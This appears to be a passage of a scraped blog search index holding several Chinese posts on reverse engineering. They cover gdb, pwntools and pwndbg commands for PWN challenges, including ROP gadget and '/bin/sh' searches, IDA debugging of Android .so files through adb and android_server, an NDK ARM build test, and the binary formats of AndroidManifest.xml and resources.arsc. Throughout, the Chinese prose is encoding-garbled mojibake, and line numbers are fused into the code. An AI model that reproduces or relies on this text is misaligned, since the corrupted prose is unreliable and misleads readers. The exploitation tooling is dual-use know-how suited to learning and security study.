run/r //é‡æ–°ä»ç¨‹åºå¼€å¤´è¿ç»­æ‰§è¡Œ (gdb) watch input[4] //è®¾ç½®è§‚å¯Ÿç‚¹ (gdb) info/i watchpoints //æŸ¥çœ‹è®¾ç½®çš„è§‚å¯Ÿç‚¹ (gdb) x/7b input //æ‰“å°å­˜å‚¨å™¨å†…å®¹ï¼Œb--æ¯ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œ7--7ç»„ (gdb) disassemble //åæ±‡ç¼–å½“å‰å‡½æ•°æˆ–æŒ‡å®šå‡½æ•° (gdb) si // ä¸€æ¡æŒ‡ä»¤ä¸€æ¡æŒ‡ä»¤è°ƒè¯• è€Œ s æ˜¯ä¸€è¡Œä¸€è¡Œä»£ç  (gdb) info registers // æ˜¾ç¤ºæ‰€æœ‰å¯„å­˜å™¨çš„å½“å‰å€¼ (gdb) x/20 $esp //æŸ¥çœ‹å†…å­˜ä¸­å¼€å§‹çš„20ä¸ªæ•° ni å•æ­¥æ‰§è¡Œä¸è¿›å…¥ si å•æ­¥æ‰§è¡Œå¹¶è¿›å…¥ disas addr å¯¹åœ°å€addrå¤„çš„æŒ‡ä»¤è¿›è¡Œåæ±‡ç¼–ï¼Œaddrå¯ä»¥æ˜¯å‡½æ•°å checksec æŸ¥çœ‹elfç¼–è¯‘çš„ä¿æŠ¤é€‰é¡¹ã€‚ æŸ¥å£³ upx -d file\nobjjump objdumpæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶å¿«é€ŸæŸ¥çœ‹å·¥å…·ã€‚ å¸¸ç”¨å‘½ä»¤ï¼š\n1. `objdump -d [file]` æŸ¥çœ‹æ–‡ä»¶çš„æ‰€æœ‰æ±‡ç¼–ä»£ç  1. `objdump -f [file]` æŸ¥çœ‹æ–‡ä»¶çš„æ¯ä¸ªæ–‡ä»¶çš„æ•´ä½“å¤´éƒ¨æ‘˜è¦ ####python\npython -c \u0026ldquo;\u0026hellip;\u0026rdquo; | ./file pythonä»¥å‘½ä»¤æ–¹å¼æ‰§è¡Œå¹¶æŠŠç»“æœä¼ é€’ç»™filepython -c \u0026ldquo;\u0026hellip;\u0026rdquo; | xargs ./file pythonä»¥å‘½ä»¤æ–¹å¼æ‰§è¡Œå¹¶å½“ä½œå‘½ä»¤è¡Œå‚æ•°ä¼ é€’ç»™fileï¼Œå…·ä½“çš„æ˜¯ï¼šâ€œå®ƒçš„ä½œç”¨æ˜¯å°†å‚æ•°åˆ—è¡¨è½¬æ¢æˆå°å—åˆ†æ®µä¼ é€’ç»™å…¶ä»–å‘½ä»¤ï¼Œä»¥é¿å…å‚æ•°åˆ—è¡¨è¿‡é•¿çš„é—®é¢˜ã€‚â€å­˜åœ¨è¿™ä¸ªå‘½ä»¤æ˜¯å› ä¸ºå¾ˆå¤šçš„å‚æ•°ä¸æ”¯æŒä»¥ç®¡é“çš„æ–¹å¼ä¼ é€’ã€‚os.system() åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹os.putenv(\u0026ldquo;name\u0026rdquo;, \u0026ldquo;value\u0026rdquo;) æ·»åŠ ä¸€ä¸ªç¯å¢ƒå˜é‡\npwntools å‚è€ƒ http://pwntools.readthedocs.io/en/stable/ ï¼ˆå®˜ç½‘ä»‹ç»ï¼‰\n[http://brieflyx.me/2015/python-module/pwntools-intro/](http://brieflyx.me/2015/python-module/pwntools-intro/) [http://brieflyx.me/2015/python-module/pwntools-advanced/](http://brieflyx.me/2015/python-module/pwntools-advanced/) ä¸€èˆ¬ç›´æ¥ç”¨from pwn import * æˆ–è€…import pwnå°†æ‰€æœ‰æ¨¡å—å¯¼å…¥åˆ°å½“å‰å‘½åç©ºé—´ï¼Œè¿™æ¡è¯­å¥è¿˜ä¼šæŠŠosã€sysç­‰å¸¸ç”¨çš„ç³»ç»Ÿåº“ä¸€å¹¶å¯¼å…¥ã€‚\nå¸¸ç”¨çš„æ¨¡å—æœ‰ä¸‹é¢å‡ ä¸ªï¼š - ==asm==:æ±‡ç¼–ä¸åæ±‡ç¼– - ==dynelf==:ç”¨äºè¿œç¨‹ç¬¦å·æ³„éœ²ï¼Œéœ€è¦æä¾›leakæ–¹æ³• - ==elf==:å¯¹elfæ–‡ä»¶è¿›è¡Œæ“ä½œ - ==gdb==:é…åˆgdbè¿›è¡Œè°ƒè¯• - ==memleak==:ç”¨äºå†…å­˜æ³„æ¼ - ==shellcraft==: shellcodeçš„ç”Ÿæˆå™¨ - ==tubes==:åŒ…æ‹¬tubes: åŒ…æ‹¬tubes.sock, tubes.process, tubes.ssh, tubes.serialtubeï¼Œåˆ†åˆ«é€‚ç”¨äºä¸åŒåœºæ™¯çš„PIPE - ==utils==:ä¸€äº›å®ç”¨çš„å°åŠŸèƒ½ï¼Œä¾‹å¦‚CRCè®¡ç®—ï¼Œcyclic patternç­‰ pwndbg arena å †æ£€æŸ¥\nmp æ˜¾ç¤ºå †\nbins,fastbins,unsorted,smallbins,largebins\nheap\ntop_chunk\nprocinfo æŸ¥çœ‹å½“å‰è¿›ç¨‹çŠ¶æ€\nrop rop --grep \u0026quot;pop rdi\u0026quot; -- --nojop --nosys --depth 2\nsearch search -s â€œ/bin/shâ€\nvvmap è™šæ‹Ÿå†…å­˜æ˜ å°„\ntelescope æ£€æŸ¥å†…å­˜è½¬å‚¨\n","date":"2018-10-22T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn_%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"PWN_å°toolsçš„ä½¿ç”¨"},{"content":"Android-ARMè¿›é˜¶ å­¦ä¹ ä¸€äº›å…³äºARMçš„æ±‡ç¼–ç»“æ„ç‰¹ç‚¹ï¼Œä»¥åŠåˆ†æã€‚ç†è§£ä¸€äº›ç»“æ„æœ€å¥½çš„æ–¹æ³•å°±æ˜¯å¤šå»å°è¯•åŠ¨æ‰‹åšã€‚ã€‚\nNDK-Buildçš„ä½¿ç”¨ å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚\nåˆ›å»ºä¸€ä¸ªAndroidé¡¹ç›®\ncd é¡¹ç›®ç›®å½•\n/ndk-build ã€‚ä¹Ÿå¯ä»¥å°†NDK-buildåŠ å…¥ç¯å¢ƒå˜é‡ã€‚\nåˆ›å»ºjniæ–‡ä»¶å¤¹ï¼Œæ·»åŠ  Android.mkå’Œ Application.mkä¸¤ä¸ªæ–‡ä»¶ã€‚ï¼ˆå‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼‰\n1 2 3 4 5 6 7 8 9 //Android.mk LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) # è¦ç”Ÿæˆçš„.soåº“åç§° LOCAL_MODULE := hello # c++æ–‡ä»¶ LOCAL_SRC_FILES := hello.cpp include $(BUILD_SHARED_LIBRARY) 1 2 3 4 //Application.mk APP_PLATFORM := android-17 # APP_ABI := all APP_ABI :=armeabi-v7a arm64-v8a æ·»åŠ hello.cppï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 #include\u0026lt;cstdio\u0026gt; int i,j; int num[] = {1,2,3,4,5}; int main() { /* code */ printf(\u0026#34;hello,world!\\n\u0026#34;); for(i=0;i\u0026lt;5;i++){ printf(\u0026#34;num value is %d\\n\u0026#34;,num[i]); } return 0; } ndk-build\npush åˆ°Androidè®¾å¤‡è¿è¡Œ\nè¿™é‡ŒARM32ä½å‡ºç°é‡Œéæ³•å¼•ç”¨ï¼ˆIllegal instructionï¼‰ã€‚ã€‚ä¹‹åå†è¯•è¯•\næ”¹æˆARM64ä¹‹ååˆå‡ºç°å†…å­˜åŒºæ®µé”™è¯¯â€œSegmentation faultâ€ æœ‰æ¯’å‘€ã€‚ã€‚å¯èƒ½æ˜¯å“ªé‡Œè®¾ç½®æœ‰é—®é¢˜ã€‚ã€‚\narm-linux-gccäº¤å‰ç¼–è¯‘å™¨ç¼–è¯‘ arm-linux-gccä¹Ÿèƒ½ç¼–è¯‘å‡ºARMå¯æ‰§è¡Œæ–‡ä»¶ã€‚sudo apt install g++-arm-linux-gnueabihf\næˆ–è€…ä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶å®‰è£…ã€‚\narm-linux-gnueabihf-g++ -static helloworld.cpp\npushè¿›Androidä¹‹åè¿è¡ŒæˆåŠŸ\nä½¿ç”¨è¿™ä¸ªæ–¹æ³•å’Œç”¨NDK-buildç¼–è¯‘çš„æœ‰å·®å¼‚ã€‚\nforå¾ªç¯ å¾…æ·»åŠ \nif-else å¾…æ·»åŠ \nwhile switch ä¼˜åŒ– ###C++\nJNI APIåˆ†æ //Android.mk LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS)\n# è¦ç”Ÿæˆçš„.soåº“åç§°\nLOCAL_MODULE := hello\n# c++æ–‡ä»¶\nLOCAL_SRC_FILES := hello.cpp include $(BUILD_SHARED_LIBRARY)\n","date":"2018-10-10T00:00:00+08:00","permalink":"https://ykiko.top/p/android-arm%E8%BF%9B%E9%98%B6/","title":"Android-ARMè¿›é˜¶"},{"content":"IDA_åŠ¨æ€è°ƒè¯•.so_åŸºæœ¬æ­¥éª¤ IDA åŠ¨æ€è°ƒè¯•.so åŸºæœ¬æ­¥éª¤ å¾…è¡¥å›¾ 0x00 IDAå¿«æ·é”® Shirt+F12 å­—ç¬¦ä¸²çª—å£\nF5å¤§æ³•å¥½ åæ±‡ç¼–\nCtrl+S æŸ¥çœ‹soå¯¹åº”æ®µçš„ä¿¡æ¯ï¼ˆéè°ƒè¯•ï¼‰ï¼Œå¿«é€Ÿå®šä½soæ–‡ä»¶çš„å†…å­˜åœ°å€ï¼ˆDebugï¼‰\nG å¿«é€Ÿè·³è½¬åˆ°å¯¹åº”åœ°å€ã€‚s\nè°ƒè¯•-F7å•æ­¥è¿›å…¥è°ƒè¯•ã€F8å•æ­¥ã€F9è¿è¡Œ\n0x01 æ–¹æ³•ä¸€ è·å–è¿è¡ŒAndroid_serverã€‚\nandroid_serveræ–‡ä»¶æ”¾åœ¨IDAå®‰è£…ç›®å½•ä¸‹çš„æ³¨æ„ç‰ˆæœ¬çš„ä¸åŒã€‚\nä¹‹ååªéœ€ push android_server /data/local/tmp/ã€‚\nä¹‹åadb shellï¼Œsu ï¼Œcd /data/local/tmp/ã€‚\nå¯èƒ½è¿˜å¾—chmod 755 android_server æ‰æœ‰æƒé™è¿è¡Œã€‚\nå»ºç«‹é€šä¿¡ã€attachè¿›ç¨‹ã€‚\nadb forward tcp:23946 tcp:23946å‘½ä»¤ã€‚\nåœ¨IDAçš„Debuggeré€‰é¡¹ä¸­attachè¿›ç¨‹ã€‚\nåŠ è½½soã€æ‰¾å‡½æ•°ä¸‹æ–­ç‚¹\nåŒå¼€IDA ï¼ŒCtrl+Sæ‰¾åˆ°soæ–‡ä»¶çš„åŸºåœ°å€ï¼Œå¦å¤–ä¸€ä¸ªIDAæ‰¾åˆ°å‡½æ•°çš„ç›¸å¯¹åœ°å€ã€‚ç›¸åŠ å¾—åˆ°ç»å¯¹åœ°å€ã€‚\n0x02 æ–¹æ³•äºŒ æ— æ³•åŠ è½½soæ–‡ä»¶éœ€è¦åœ¨åŠ è½½ä¹‹å‰æ–­ç‚¹ã€‚åè°ƒè¯•ä¹‹ç±»\nDebugæ–¹å¼å¯åŠ¨appã€‚éœ€è¦åº”ç”¨å¯è°ƒè¯•å¼€å¯\nadb shell am start -D -n åŒ…å/.MainActivity\næ–¹æ³•ä¸€çš„1ï¼Œ2ä¸¤æ­¥ å‹¾é€‰é€‰é¡¹ã€‚\njdb attachç¨‹åº\njdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700\nå¼€å§‹è°ƒè¯• åŒä¸Š\n","date":"2018-08-31T00:00:00+08:00","permalink":"https://ykiko.top/p/ida_%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so_%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/","title":"IDA_åŠ¨æ€è°ƒè¯•.so_åŸºæœ¬æ­¥éª¤"},{"content":"Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡5-6 ä¸€ã€ åŸºç¡€ç¯‡â‘¤-â‘¥ è¿™ä¸¤ç« ä¸»è¦æè¿°AndroidManifest.xmlå’Œresourec.arscè¿™ä¸¤ä¸ªandroidæ–‡ä»¶ã€‚å†…å®¹ä¸æ˜¯å¾ˆå¤šï¼Œä¸‹é¢æ˜¯ä¸¤ç« çš„ç¬”è®°ã€‚\nç¬¬äº”ç«  AndroidManifest.xmlæ ¼å¼è§£æ AndroidManifest.xml\nAndroidManifest.xmlæ–‡ä»¶æ ¼å¼å›¾\nå¤´éƒ¨ä¿¡æ¯ æ–‡ä»¶é­”æ•°ï¼š4bytesã€‚\næ–‡ä»¶å¤§å°ï¼š4bytesã€‚\nChunkå†…å®¹ å¤´éƒ¨ç›¸åŒï¼ˆChunkType(4bytes)ã€ChunkSize(4bytes)ï¼‰ã€‚\nSting Chunk ï¼šä¸»è¦ç”¨äºå­˜æ”¾AndroidManifest.xmlæ–‡ä»¶ä¸­æ‰€æœ‰çš„å­—ç¬¦ä¸²ä¿¡æ¯ã€‚\nChunkTypeï¼šç±»å‹ï¼Œå›ºå®š4bytesï¼ˆ0x001C001)ã€‚\nChunkSizeï¼šå¤§å°ï¼Œ4bytesã€‚\nStringCountï¼šå­—ç¬¦ä¸²çš„ä¸ªæ•° ï¼Œ4bytesã€‚\nStyleCount ï¼šæ ·å¼çš„ä¸ªæ•°ï¼Œ4bytesã€‚\nUnknown ï¼šä½ç½®åŒºåŸŸã€‚4bytesã€‚\nStringPoolOffset ï¼šå­—ç¬¦ä¸²æ± çš„åç§»å€¼ã€‚4bytesã€‚åç§»å€¼ç›¸å¯¹äºStringChunkå¤´éƒ¨çš„ä½ç½®ã€‚\nStylePoolOffset : æ ·å¼æ± çš„åç§»å€¼ã€‚4bytesã€‚æ²¡æœ‰Styleå¯å¿½ç•¥ã€‚\nStringOffsets ï¼šæ¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„åç§»å€¼ï¼Œå¤§å°ä¸ºStringChunk*4ã€‚\nStyleOffsetsï¼šæ¯ä¸ªæ ·å¼çš„åç§»å€¼ï¼Œå¤§å°ä¸ºStyleChunk*4ã€‚\nå¦‚ä½•è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Ÿ\nResourceld Chunk ï¼šä¸»è¦ç”¨æ¥å­˜æ”¾AndroidManifest ä¸­ç”¨åˆ°çš„ç³»ç»Ÿå±æ€§å€¼å¯¹åº”çš„èµ„æºID\nChunkTypeï¼šç±»å‹ï¼Œå›ºå®š4bytesï¼ˆ0x00080108ï¼‰ã€‚\nChunkSizeï¼šå¤§å°ï¼Œ4bytesã€‚\nResourceIds : å†…å®¹ï¼Œå¤§å°ä¸ºResourceld Chunkå¤§å°é™¤ä»¥4å‡å»å¤´éƒ¨çš„8å­—èŠ‚ã€‚\nè§£æï¼Ÿ\nStart Namespace Chunkï¼šä¸»è¦åŒ…å«äº†AndroidMaifestæ–‡ä»¶ä¸­çš„å‘½åç©ºé—´çš„å†…å®¹ï¼Œandroidä¸­çš„xmléƒ½æ˜¯é‡‡ç”¨Schemaæ ¼å¼ï¼ˆä¸¤ç§æ ¼å¼DTDå’ŒSchemaï¼‰çš„ï¼Œæ‰€æœ‰è‚¯å®šæœ‰Prefixå’ŒURIã€‚\nChunk Typeï¼šç±»å‹ï¼Œå›ºå®š4bytesã€‚ï¼ˆ0x00100100)ã€‚\nChunk Sizeï¼šå¤§å°ï¼Œ4bytesã€‚\nLine Number ï¼šAndroidMaifestæ–‡ä»¶ä¸­è¡Œå·ï¼Œ4bytesã€‚\nUnknownï¼šæœªçŸ¥åŒºåŸŸ,4bytesã€‚\nPrefixï¼šå‘½åç©ºé—´çš„å‰ç¼€ï¼ˆåœ¨å­—ç¬¦ä¸²ä¸­çš„ç´¢å¼•å€¼ï¼‰ï¼Œeg:androidã€‚\nUriï¼šå‘½åç©ºé—´çš„URIï¼ˆåœ¨å­—ç¬¦ä¸²ä¸­çš„ç´¢å¼•å€¼ï¼‰ï¼Œeg:http://schemas.android.com/apk/res/android\nStart Tag Chunkï¼šAndroidMaifest.xmlçš„æ ‡ç­¾ä¿¡æ¯ï¼Œæœ€æ ¸å¿ƒçš„å†…å®¹ï¼Œä¹Ÿæ˜¯æœ€å¤æ‚çš„å†…å®¹ã€‚\nChunk Typeï¼šç±»å‹ï¼Œå›ºå®š4bytesã€‚ï¼ˆ0x00100102)ã€‚\nChunk Sizeï¼šå¤§å°ï¼Œ4bytesã€‚\nLine Number ï¼šå¯¹åº”AndroidMaifestä¸­çš„è¡Œå·ï¼Œ4bytesã€‚\nUnknownï¼šæœªçŸ¥åŒºåŸŸ,4bytesã€‚\nNamespace Uri ï¼šå‘½åç©ºé—´çš„Uriï¼Œ4bytesã€‚\nNameï¼šæ ‡ç­¾åç§°ï¼ˆåœ¨å­—ç¬¦ä¸²ä¸­çš„ç´¢å¼•å€¼ï¼‰ï¼Œ4bytesã€‚\nFlagsï¼šæ ‡ç­¾çš„ç±»å‹ï¼Œ4bytesã€‚egï¼šæ˜¯å¼€å§‹æ ‡ç­¾è¿˜æ˜¯ç»“æŸæ ‡ç­¾ï¼Ÿ\nAttributes Counkï¼šä¾¿ç­¾ä¸­åŒ…å«çš„å±æ€§çš„ä¸ªæ•°ï¼Œ4bytesã€‚\nClass Attributeï¼šæ ‡ç­¾åŒ…å«çš„ç±»å±æ€§ï¼Œ4bytesã€‚\nAttributes ï¼šå±æ€§å†…å®¹ï¼Œæ¯ä¸ªå±æ€§ç®—æ˜¯ä¸€ä¸ªEntryï¼ŒEntryæ˜¯ä¸€ä¸ªå¤§å°5çš„å­—èŠ‚æ•°ç»„[Namespace,URI,Name,ValueString,Data]ï¼Œå¤§å°ä¸ºâ€å±æ€§ä¸ªæ•°* 5 *4\u0026quot;ä¸ªå­—èŠ‚ã€‚\nAXMLPrinterå·¥å…· aapt å·¥å…· ç¬¬å…­ç«  resourec.arscæ–‡ä»¶æ ¼å¼è§£æ èµ„æºæ–‡ä»¶idæ ¼å¼ resourec.arscæ–‡ä»¶æ ¼å¼\næ•°æ®ç»“æ„ ä¸Šå›¾\nå¤´éƒ¨ä¿¡æ¯\nresourec.arscæ–‡ä»¶æ ¼å¼ç”±ä¸€ç³»åˆ—chunkç»„æˆï¼Œæ¯ä¸€ä¸ªchunkå‡åŒ…å«ä¸€ä¸ªResChunk_header\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class ResChunkHeader{ public short type; //å½“å‰chunkçš„ç±»å‹ public short headerSize; //å½“å‰chunkçš„å¤´éƒ¨å¤§å° public int size; //å½“å‰chunkçš„å¤§å° public int getHeaderSize(){ return 2+2+4 } @Override public String toString(){ return \u0026#34;type:\u0026#34;+Utils.bytesToHexString( Utils.int2Byte(type))+\u0026#34;,headerSize:\u0026#34;+headerSize+\u0026#34;,size:\u0026#34;+size; } } èµ„æºç´¢å¼•è¡¨çš„å¤´éƒ¨ä¿¡æ¯\nresourec.arscçš„ç¬¬ä¸€ä¸ªç»“æ„ï¼Œç»“æ„æè¿°äº†Resource.arscæ–‡ä»¶çš„å¤§å°å’Œèµ„æºåŒ…æ•°é‡ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class ResTableHeader { public ResChunkHeader header; //å°±æ˜¯æ ‡å‡†çš„Chunkå¤´éƒ¨ä¿¡æ¯æ ¼å¼ public int packageCount; //è¢«ç¼–è¯‘çš„èµ„æºåŒ…çš„ä¸ªæ•° public ResTableHeader(){ header = new ResChunkHeader(); } public int getHeaderSize(){ return header.getHeaderSize() + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34; + \u0026#34;packageCount:\u0026#34;+packageCount; } } èµ„æºé¡¹çš„å€¼å­—ç¬¦ä¸²èµ„æºæ± æ¥ç€å¤´éƒ¨çš„çš„æ˜¯ä¸¤ä¸ªåç§»æ•°ç»„ï¼Œåˆ†åˆ«æ˜¯å­—ç¬¦ä¸²åç§»æ•°ç»„å’Œå­—ç¬¦ä¸²æ ·å¼åç§»æ•°ç»„ã€‚è¿™ä¸¤ä¸ªåç§»æ•°ç»„çš„å¤§å°åˆ†åˆ«ç­‰äºstringCountå’ŒstyleCountçš„å€¼ï¼Œè€Œæ¯ä¸€ä¸ªå…ƒç´ çš„ç±»å‹éƒ½æ˜¯æ— ç¬¦å·æ•´å‹ã€‚æ•´ä¸ªå­—ç¬¦ä¸­èµ„æºæ± ç»“æ„å¦‚ä¸‹ã€‚\nåŒ…å«äº†æ‰€æœ‰åœ¨èµ„æºåŒ…é‡Œé¢å®šä¹‰çš„èµ„æºé¡¹çš„å€¼å­—ç¬¦ä¸²ï¼Œç»“æ„å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public class ResStringPoolHeader { public ResChunkHeader header; //æ ‡å‡†çš„Chunkå¤´éƒ¨ä¿¡æ¯ç»“æ„ public int stringCount; //å­—ç¬¦ä¸²çš„ä¸ªæ•° public int styleCount; //å­—ç¬¦ä¸²æ ·å¼çš„ä¸ªæ•° public final static int SORTED_FLAG = 1; public final static int UTF8_FLAG = (1\u0026lt;\u0026lt;8); public int flags; //å­—ç¬¦ä¸²çš„å±æ€§,å¯å–å€¼åŒ…æ‹¬0x000(UTF-16),0x001(å­—ç¬¦ä¸²ç»è¿‡æ’åº)ã€0X100(UTF-8)å’Œä»–ä»¬çš„ç»„åˆå€¼ public int stringsStart; //å­—ç¬¦ä¸²å†…å®¹å—ç›¸å¯¹äºå…¶å¤´éƒ¨çš„è·ç¦» public int stylesStart; //å­—ç¬¦ä¸²æ ·å¼å—ç›¸å¯¹äºå…¶å¤´éƒ¨çš„è·ç¦» public ResStringPoolHeader(){ header = new ResChunkHeader(); } public int getHeaderSize(){ return header.getHeaderSize() + 4 + 4 + 4 + 4 + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34; + \u0026#34;stringCount:\u0026#34;+stringCount+\u0026#34;,styleCount:\u0026#34;+styleCount+\u0026#34;,flags:\u0026#34;+flags+\u0026#34;,stringStart:\u0026#34;+stringsStart+\u0026#34;,stylesStart:\u0026#34;+stylesStart; } } å­—ç¬¦ä¸²èµ„æºæ± ä¸­çš„å­—ç¬¦ä¸²å‰ä¸¤ä¸ªå­—èŠ‚ä¸ºå­—ç¬¦ä¸²é•¿åº¦,é•¿åº¦è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼š\nlen = (((hbyte \u0026amp; 0x7F) \u0026lt;\u0026lt; 8)) | lbyte;\nå¦‚æœå­—ç¬¦ä¸²ç¼–ç æ ¼å¼ä¸ºUTF-8åˆ™å­—ç¬¦ä¸²ä»¥0X00ä½œä¸ºç»“æŸç¬¦,UTF-16åˆ™ä»¥0X0000ä½œä¸ºç»“æŸç¬¦ã€‚\nPackageæ•°æ®å—\nè¿™ä¸ªæ•°æ®å—è®°å½•ç¼–è¯‘åŒ…çš„å…ƒæ•°æ®ï¼Œå¤´éƒ¨ä¿¡æ¯å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTablePackage { public ResChunkHeader header; //Chunkçš„å¤´éƒ¨ä¿¡æ¯æ•°æ®ç»“æ„ public int id; //åŒ…çš„ID,ç­‰äºPackage Id,ä¸€èˆ¬ç”¨æˆ·åŒ…çš„å€¼Package Idä¸º0X7F,ç³»ç»Ÿèµ„æºåŒ…çš„Package Idä¸º0X01ï¼› public char[] name = new char[128]; //åŒ…å public int typeStrings; //ç±»å‹å­—ç¬¦ä¸²èµ„æºæ± ç›¸å¯¹å¤´éƒ¨çš„åç§» public int lastPublicType; //æœ€åä¸€ä¸ªå¯¼å‡ºçš„Publicç±»å‹å­—ç¬¦ä¸²åœ¨ç±»å‹å­—ç¬¦ä¸²èµ„æºæ± ä¸­çš„ç´¢å¼•ï¼Œç›®å‰è¿™ä¸ªå€¼è®¾ç½®ä¸ºç±»å‹å­—ç¬¦ä¸²èµ„æºæ± çš„å…ƒç´ ä¸ªæ•°ã€‚åœ¨è§£æçš„è¿‡ç¨‹ä¸­æ²¡å‘ç°ä»–çš„ç”¨é€” public int keyStrings; //èµ„æºé¡¹åç§°å­—ç¬¦ä¸²ç›¸å¯¹å¤´éƒ¨çš„åç§» public int lastPublicKey; // æœ€åä¸€ä¸ªå¯¼å‡ºçš„Publicèµ„æºé¡¹åç§°å­—ç¬¦ä¸²åœ¨èµ„æºé¡¹åç§°å­—ç¬¦ä¸²èµ„æºæ± ä¸­çš„ç´¢å¼•ï¼Œç›®å‰è¿™ä¸ªå€¼è®¾ç½®ä¸ºèµ„æºé¡¹åç§°å­—ç¬¦ä¸²èµ„æºæ± çš„å…ƒç´ ä¸ªæ•°ã€‚åœ¨è§£æçš„è¿‡ç¨‹ä¸­æ²¡å‘ç°ä»–çš„ç”¨é€” public ResTablePackage(){ header = new ResChunkHeader(); } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34;+\u0026#34;,id=\u0026#34;+id+\u0026#34;,name:\u0026#34;+name.toString()+\u0026#34;,typeStrings:\u0026#34;+typeStrings+\u0026#34;,lastPublicType:\u0026#34;+lastPublicType+\u0026#34;,keyStrings:\u0026#34;+keyStrings+\u0026#34;,lastPublicKey:\u0026#34;+lastPublicKey; } } ç±»å‹è§„èŒƒæ•°æ®å—\nç”¨æ¥æè¿°èµ„æºé¡¹çš„é…ç½®å·®å¼‚æ€§ã€‚æ¯ä¸€ç§ç±»å‹éƒ½å¯¹åº”æœ‰ä¸€ä¸ªç±»å‹è§„èŒƒæ•°æ®å—ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTableTypeSpec { public final static int SPEC_PUBLIC = 0x40000000; public ResChunkHeader header; //Chunkçš„å¤´éƒ¨ä¿¡æ¯ç»“æ„ public byte id; //æ ‡è¯†èµ„æºçš„Type ID,Type IDæ˜¯æŒ‡èµ„æºçš„ç±»å‹IDã€‚èµ„æºçš„ç±»å‹æœ‰animatorã€animã€colorã€drawableã€layoutã€menuã€rawã€stringå’Œxmlç­‰ç­‰è‹¥å¹²ç§ï¼Œæ¯ä¸€ç§éƒ½ä¼šè¢«èµ‹äºˆä¸€ä¸ªIDã€‚ public byte res0; //ä¿ç•™,å§‹ç»ˆä¸º0 public short res1; //ä¿ç•™,å§‹ç»ˆä¸º0 public int entryCount; //ç­‰äºæœ¬ç±»å‹çš„èµ„æºé¡¹ä¸ªæ•°,æŒ‡åç§°ç›¸åŒçš„èµ„æºé¡¹çš„ä¸ªæ•°ã€‚ public ResTableTypeSpec(){ header = new ResChunkHeader(); } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;,id:\u0026#34;+id+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,res1:\u0026#34;+res1+\u0026#34;,entryCount:\u0026#34;+entryCount; } } èµ„æºç±»å‹é¡¹æ•°æ®å—\næè¿°èµ„æºé¡¹çš„å…·ä½“ä¿¡æ¯ï¼Œåç§°ã€å€¼ã€é…ç½®ç­‰ä¿¡æ¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 public class ResTableType { public ResChunkHeader header; //Chunkçš„å¤´éƒ¨ä¿¡æ¯ç»“æ„ public final static int NO_ENTRY = 0xFFFFFFFF; public byte id; //æ ‡è¯†èµ„æºçš„Type ID public byte res0; //ä¿ç•™,å§‹ç»ˆä¸º0 public short res1; //ä¿ç•™,å§‹ç»ˆä¸º0 public int entryCount; //ç­‰äºæœ¬ç±»å‹çš„èµ„æºé¡¹ä¸ªæ•°,æŒ‡åç§°ç›¸åŒçš„èµ„æºé¡¹çš„ä¸ªæ•°ã€‚ public int entriesStart; //ç­‰äºèµ„æºé¡¹æ•°æ®å—ç›¸å¯¹å¤´éƒ¨çš„åç§»å€¼ã€‚ public ResTableConfig resConfig; //æŒ‡å‘ä¸€ä¸ªResTable_config,ç”¨æ¥æè¿°é…ç½®ä¿¡æ¯,åœ°åŒº,è¯­è¨€,åˆ†è¾¨ç‡ç­‰ public ResTableType(){ header = new ResChunkHeader(); resConfig = new ResTableConfig(); } public int getSize(){ return header.getHeaderSize() + 1 + 1 + 2 + 4 + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;,id:\u0026#34;+id+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,res1:\u0026#34;+res1+\u0026#34;,entryCount:\u0026#34;+entryCount+\u0026#34;,entriesStart:\u0026#34;+entriesStart; } } ResTable_typeåæ¥ç€æ˜¯ä¸€ä¸ªå¤§å°ä¸ºentryCountçš„uint32_tæ•°ç»„ï¼Œæ¯ä¸€ä¸ªæ•°ç»„å…ƒç´ éƒ½ç”¨æ¥æè¿°ä¸€ä¸ªèµ„æºé¡¹æ•°æ®å—çš„åç§»ä½ç½®ã€‚ ç´§è·Ÿåœ¨è¿™ä¸ªåç§»æ•°ç»„åé¢çš„æ˜¯ä¸€ä¸ªå¤§å°ä¸ºentryCountçš„ResTable_entryæ•°ç»„,æ¯ä¸€ä¸ªæ•°ç»„å…ƒç´ éƒ½ç”¨æ¥æè¿°ä¸€ä¸ªèµ„æºé¡¹çš„å…·ä½“ä¿¡æ¯ã€‚ResTable_entryçš„ç»“æ„å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 